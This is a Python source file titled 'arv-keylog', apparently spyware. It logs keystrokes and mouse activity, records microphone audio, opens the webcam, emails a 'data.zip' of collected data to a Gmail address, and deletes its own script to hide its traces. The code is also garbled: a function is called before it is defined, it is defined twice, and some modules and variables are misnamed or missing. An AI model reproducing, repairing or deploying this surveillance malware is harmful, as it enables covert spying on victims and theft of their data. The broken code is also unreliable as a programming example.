# arv-keylog
send_email("data.zip")
import os
import smtplib
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
def send_email(arv):
    fromaddr = "cid.arvinda@gmail.com"
    toaddr = "cid.arvinda108@gmail.com"
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Data Collection Report"
    body = "Please find attached the data collected."
    msg.attach(MIMEText(body, 'plain'))
    attachment = open(arv, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % arv)
    msg.attach(part)
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, "your_password")
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()

def send_email(key):
    fromaddr = "your_email@gmail.com"
    toaddr = "destination_email@gmail.com"

    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Data Collection Report"
    body = "Please find attached the data collected."
    msg.attach(MIMEText(body, 'plain'))
    attachment = open(filename, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, "your_password")
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()
send_email("data.zip")
os.remove(__file__)
from pynput.keyboard import Listener
def on_press(key):
    print(f'Key {key} pressed')
def on_release(key):
    if key == key.esc:
        return False
with Listener(on_press=on_press,on_release=on_release)as listener:
    listener.join()
    import sounddevice as sd
    import soundfile as sd
    duration = 100
    fs = 44100
    filename = 'audio.wav'
    print('Recording...')
    my_recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()
    print('Recording done!')
    sf.write(filename, my_recording, fs)
import cv2
cap = cv2.VideoCapture(0)
while True:
    ret, frame = cap.read()
    cv2.imshow('frame', frame)
    if cv2.waitKey(1) & 0xFF == ord('q'):
     break
cap.release()
cv2.destroyAllWindows()
from pynput.mouse import Listener
def on_move(x, y):
    print(f'Mouse moved to ({x}, {y})')
def on_click(x, y, button, pressed):
    print(f'{"Pressed" if pressed else "Released"} at ({x}, {y})')
def on_scroll(x, y, dx, dy):
    print(f'Scrolled at ({x}, {y}) with delta ({dx}, {dy})')
with Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener:
    listener.join()
